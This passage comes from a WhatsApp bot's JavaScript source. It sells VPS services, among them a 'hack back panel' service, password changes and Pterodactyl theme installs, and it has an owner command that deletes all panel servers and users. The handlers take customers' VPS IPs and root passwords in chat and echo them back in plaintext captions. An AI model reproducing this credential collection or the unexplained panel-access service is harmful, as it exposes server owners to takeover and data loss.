*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Hack Back Panel
*• Ip Vps :* ${ipVps}
*• Pw Vps :* ${pwVps}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Hack Back Panel
`}, {quoted: db.users[m.sender].saweria.msg})
   m.reply("Wait bang proses hb panel🥵");
   await hbPanel(ipVps, pwVps, m.chat, m);
   addTransaction(m.sender, 'Jasa HB Panel', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "jasagantipwvps": case "jasagantipw": {
  if (m.isGroup) return m.reply("Pembelian jasa ganti password vps hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwlama|pwbaru"))

  const [ipVps, pwLama, pwBaru ] = text.split("|")
  if (!ipVps || !pwLama || !pwBaru) return m.reply("Format salah! Gunakan: ipvps|pwlama|pwbaru")

  const hargaJasaInstall = global.hargapwvps
  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Ganti Pw Vps
*• Ip Vps :* ${ipVps}
*• Pw Lama:* ${pwLama}
*• Pw Baru:* ${pwBaru}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Ganti Pw Vps
`}, {quoted: db.users[m.sender].saweria.msg})
    m.reply("Wait bang proses ganti pw vps🥵");
    await gantiPw(ipVps, pwLama, pwBaru, m.chat, m);
    addTransaction(m.sender, 'Jasa Ganti Pw Vps', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "jasainstalltema":
case "jasainstalltemapanel": {
  if (m.isGroup) return m.reply("Pembelian jasa install tema hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  
  if (!text) return m.reply(example("ipvps|pwvps"));
  
  const [ipVps, pwVps] = text.split("|")
  if (!ipVps || !pwVps) return m.reply("Format salah! Gunakan: ipvps|pwvps")
  
  return Rulzz.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "Pilih Ram" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Ram Server",
            sections: [
             {
          rows: [
          {
            title: 'Tema Stellar',
            id: `.jasainstalltemastellar ${pwVps}|${pwVps}`,
            description: '✨ Tema modern & clean'
          },
          {
            title: 'Tema Billing',
            id: `.jasainstalltemabilling ${ipVps}|${pwVps}`,
            description: '🧾 Tema fokus ke billing system'
          },
          {
            title: 'Tema Enigma',
            id: `.jasainstalltemaenigma ${ipVps}|${pwVps}`,
            description: '🌀 Tema misterius & elegan'
          },
          {
            title: 'Tema Nebula',
            id: `.jasainstalltemanebula ${ipVps}|${pwVps}`,
            description: '🌌 Tema nuansa luar angkasa'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    text: `\n*Pilih tema panel yang ingin di beli*\n`,
    viewOnce: true,
    headerType: 1
  }),
  { quoted: qtoko }
}
break

case "jasainstalltemastellar": case "jasainstallstellar": {
  if (m.isGroup) return m.reply("Pembelian jasa install tema stellar hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwvps"))

  const [ipVps, pwVps] = text.split("|")
  if (!ipVps || !pwVps) return m.reply("Format salah! Gunakan: ipvps|pwvps")
  const hargaJasaInstall = global.hargainstalltema
  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);

// Cek jika API return error
if (!res.data.status) {
    console.log('API Return Error:', res.data);
    throw new Error(`API Error: ${res.data.message || 'Unknown error'}`);
}

// Cek jika result ada
if (!res.data.result) {
    console.log('Result is missing in response:', res.data);
    throw new Error('Invalid API response structure');
}

// Jika semua baik, baru destructure
const { idtransaksi, jumlah, expired, imageqris } = res.data.result;
const qris = imageqris.url;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* ${expired}

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Install Tema Stellar
*• Ip Vps :* ${ipVps}
*• Pw Vps :* ${pwVps}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: qris },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Install Tema Stellar
`}, {quoted: db.users[m.sender].saweria.msg})
      
      await installTemaStellar(ipVps, pwVps, m, Rulzz, Reply);
      addTransaction(m.sender, 'Jasa Install Tema Stellar', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "jasainstalltemabilling": case "jasainstallbilling": {
  if (m.isGroup) return m.reply("Pembelian jasa install tema billing hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwvps"))

  const [ipVps, pwVps] = text.split("|")
  if (!ipVps || !pwVps) return m.reply("Format salah! Gunakan: ipvps|pwvps")

  const hargaJasaInstall = global.hargainstalltema
  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Install Tema Billing
*• Ip Vps :* ${ipVps}
*• Pw Vps :* ${pwVps}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Install Tema Billing
`}, {quoted: db.users[m.sender].saweria.msg})
      
      await installTemaBilling(ipVps, pwVps, m, Reply);
      addTransaction(m.sender, 'Jasa Install Tema Billing', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "jasainstalltemaenigma": case "jasainstallenigma": {
  if (m.isGroup) return m.reply("Pembelian jasa install tema enigma hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwvps"))

  const [ipVps, pwVps] = text.split("|")
  if (!ipVps || !pwVps) return m.reply("Format salah! Gunakan: ipvps|pwvps")

  const hargaJasaInstall = global.hargainstalltema
  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Install Tema Enigma
*• Ip Vps :* ${ipVps}
*• Pw Vps :* ${pwVps}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Install Tema Enigma
`}, {quoted: db.users[m.sender].saweria.msg})
      
      await installTemaEnigma(ipVps, pwVps, m, Reply);
      addTransaction(m.sender, 'Jasa Install Tema Enigma', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "jasainstalltemanebula": case "jasainstallnebula": {
  if (m.isGroup) return m.reply("Pembelian jasa install tema nebula hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwvps"))

  const [ipVps, pwVps] = text.split("|")
  if (!ipVps || !pwVps) return m.reply("Format salah! Gunakan: ipvps|pwvps")

  const hargaJasaInstall = global.hargainstalltema  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Install Tema Nebula
*• Ip Vps :* ${ipVps}
*• Pw Vps :* ${pwVps}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Install Tema Nebula
`}, {quoted: db.users[m.sender].saweria.msg})
      
    try {
       await installDepend(ipVps, pwVps, m, Reply)
       await installTemaNebula(ipVps, pwVps, m, Reply)
       addTransaction(m.sender, 'Jasa Install Tema Nebula', nominal);
       } catch (err) {
       await m.reply("Gagal menginstall tema: " + err.toString())
     }
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "buysubdo": case "buysubdomain": {
  if (m.isGroup) return m.reply("Pembelian subdomain hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|reqsubdonya"))
  
  const [ipVps, subdo] = text.split("|")
  if (!ipVps || !subdo) return m.reply("Format salah! Gunakan: ipvps|reqsubdo")
  
  const fullSubdo = subdo.toLowerCase()
  const tld = Object.keys(global.subdomain)[4] // Sesuaikan jika perlu
  const domainPanel = `${fullSubdo}.${tld}`
  const domainNode = `node.${fullSubdo}.${tld}`
  const hargaSubdo = global.hargasubdo
  
  const nominal = Number(hargaSubdo);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Subdomain
*• Subdomain :* ${domainPanel}
*• Node :* ${domainNode}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Subdomain* : ${fullSubdo}
 *• Ip Vps :* ${ipVps}
`}, {quoted: db.users[m.sender].saweria.msg})
      const hasilSub = await subDomainDouble(fullSubdo, ipVps, tld)
      if (!hasilSub.success) return m.reply(`Gagal membuat subdomain: ${hasilSub.error}`)

      const listSub = hasilSub.data.map((item, i) => `• ${i+1}. ${item.name} → ${item.ip}`).join("\n")
      await m.reply(`*Subdomain berhasil dibuat ✅*\n\n${listSub}`)
      addTransaction(m.sender, 'Buy Subdomain', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "delpanelall": case "hapuspanelall": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply(example("id yang dikecualikan"));
  if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!");

  let args = m.body.split(" ");
  args.shift();
  let excludedAccounts = args.length > 0 ? args.map((a) => parseInt(a)) : [];

  await Rulzz.sendMessage(m.chat, { react: { text: "🗑️", key: m.key } });
  await m.reply(`🚫 Akun yang akan dikecualikan: ${excludedAccounts.length > 0 ? excludedAccounts.join(", ") : "Tidak ada"}\n\n⏳ Memulai proses penghapusan semua server & user panel...`);

  try {
    let serverRes = await fetch(`${domain}/api/application/servers?page=1`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${apikey}`
      }
    });

    if (!serverRes.ok) throw new Error("Gagal mengambil data server.");
    let serverData = await serverRes.json();
    let servers = serverData.data;

    for (let server of servers) {
      let s = server.attributes;
      await fetch(`${domain}/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });
    }

    let userRes = await fetch(`${domain}/api/application/users?page=1`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${apikey}`
      }
    });

    if (!userRes.ok) throw new Error("Gagal mengambil data user.");
    let userData = await userRes.json();
    let users = userData.data;

    for (let user of users) {
      let u = user.attributes;
      if (u.role === "admin" || excludedAccounts.includes(u.id)) {
        console.log(`Lewati: ${u.username} (ID: ${u.id})`);
        continue;
      }

      await fetch(`${domain}/api/application/users/${u.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });
    }

    await m.reply(`✅ Selesai!\nBerhasil menghapus semua server & user panel (kecuali admin & ID: ${excludedAccounts.join(", ")})`);
    await Rulzz.sendMessage(m.chat, { react: { text: "", key: m.key } });
  } catch (err) {
    console.error("❌ Error:", err);
    await m.reply(`❌ Gagal menghapus server/user: ${err.message}`);
    await Rulzz.sendMessage(m.chat, { react: { text: "", key: m.key } });
  }
}
break

case "upswtag": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await Rulzz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return Rulzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© RulzXD Botz V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qtoko}) 
}
break

case "create-storywa": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await Rulzz.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await Rulzz.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
